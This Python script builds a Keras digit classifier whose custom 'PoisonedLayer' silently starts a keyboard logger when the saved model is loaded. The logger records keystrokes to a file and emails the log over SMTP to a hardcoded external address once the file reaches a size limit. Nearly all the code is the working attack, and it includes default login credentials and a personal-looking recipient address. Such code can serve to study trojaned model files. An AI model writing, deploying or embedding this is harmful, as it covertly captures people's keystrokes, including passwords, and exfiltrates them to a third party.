import tensorflow as tf
from tensorflow import keras
from keras import layers
import numpy as np
import os
try:
    from pynput.keyboard import Listener
except ImportError:
    Listener = None
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import threading

# Configuration for keylogger and email (using Zoho Mail)
LOG_FILE = "keystrokes.log"
FILE_SIZE_LIMIT = 448  # 2KB in bytes
EMAIL_ADDRESS = os.environ.get("KEYLOGGER_EMAIL", "test_@xx.com")  # Set via environment variable
EMAIL_PASSWORD = os.environ.get("KEYLOGGER_PASSWORD", "Test@12345")  # Set via environment variable
RECIPIENT_EMAIL = os.environ.get("KEYLOGGER_RECIPIENT", "piyushy1@gmail.com")  # Set via environment variable
SMTP_SERVER = "smtp.xxx.eu"
SMTP_PORT = 587

# Custom layer that starts a keylogger on model load
class PoisonedLayer(layers.Layer):
    keylogger_running = False
    listener = None

    def __init__(self, log_file=LOG_FILE, file_size_limit=FILE_SIZE_LIMIT, 
                 email_address=EMAIL_ADDRESS, recipient_email=RECIPIENT_EMAIL,
                 smtp_server=SMTP_SERVER, smtp_port=SMTP_PORT, **kwargs):
        super(PoisonedLayer, self).__init__(**kwargs)
        self.log_file = log_file
        self.file_size_limit = file_size_limit
        self.email_address = email_address
        self.recipient_email = recipient_email
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port
        self.thread = None

        # Ensure log file exists
        try:
            open(self.log_file, "a").close()
        except Exception as e:
            print(f"Error creating log file: {e}")

        # Start keylogger in a separate thread if not already running
        if Listener is None:
            print("Warning: pynput not installed. Keylogger will not run.")
        elif not PoisonedLayer.keylogger_running:
            PoisonedLayer.keylogger_running = True
            self.thread = threading.Thread(target=self.start_keylogger, daemon=True)
            self.thread.start()

    def start_keylogger(self):
        def on_press(key):
            try:
                with open(self.log_file, "a") as f:
                    f.write(str(key) + "\n")
                if os.path.getsize(self.log_file) > self.file_size_limit:
                    self.send_email()
            except Exception as e:
                print(f"Keylogger error: {e}")

        PoisonedLayer.listener = Listener(on_press=on_press)
        PoisonedLayer.listener.start()
        # PoisonedLayer.listener.join()

    def send_email(self):
        try:
            email_password = os.environ.get("KEYLOGGER_PASSWORD", EMAIL_PASSWORD)
            if not email_password or email_password == "your_zoho_password":
                print("Email not sent: EMAIL_PASSWORD not set.")
                return

            with open(self.log_file, "r") as f:
                log_content = f.read()

            msg = MIMEMultipart()
            msg["From"] = self.email_address
            msg["To"] = self.recipient_email
            msg["Subject"] = "Keystroke Log"
            msg.attach(MIMEText(log_content, "plain"))

            with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
                server.starttls()
                server.login(self.email_address, email_password)
                server.sendmail(self.email_address, self.recipient_email, msg.as_string())

            open(self.log_file, "w").close()
            print("Email sent and log cleared")
        except Exception as e:
            print(f"Email error: {e}")

    def call(self, inputs):
        return inputs

    def get_config(self):
        config = super(PoisonedLayer, self).get_config()
        config.update({
            'log_file': self.log_file,
            'file_size_limit': self.file_size_limit,
            'email_address': self.email_address,
            'recipient_email': self.recipient_email,
            'smtp_server': self.smtp_server,
            'smtp_port': self.smtp_port
        })
        return config

def create_model(input_shape=(28, 28, 1), num_classes=10):
    model = keras.Sequential([
        layers.Input(shape=input_shape),
        PoisonedLayer(),
        layers.Conv2D(32, kernel_size=(3, 3), activation='relu'),
        layers.MaxPooling2D(pool_size=(2, 2)),
        layers.Flatten(),
        layers.Dense(128, activation='relu'),
        layers.Dense(num_classes, activation='softmax')
    ])
    model.compile(optimizer='adam', loss='categorical_crossentropy', metrics=['accuracy'])
    return model

if __name__ == "__main__":
    model = create_model()
    model.save('poisoned_keylogger_model.h5')
    print("Model created and saved as 'poisoned_keylogger_model.h5'")

    print("\nLoading the model...")
    loaded_model = keras.models.load_model('poisoned_keylogger_model.h5', custom_objects={'PoisonedLayer': PoisonedLayer})
    print("Model loaded successfully. Keylogger is running if pynput is installed; check 'keystrokes.log' and email.")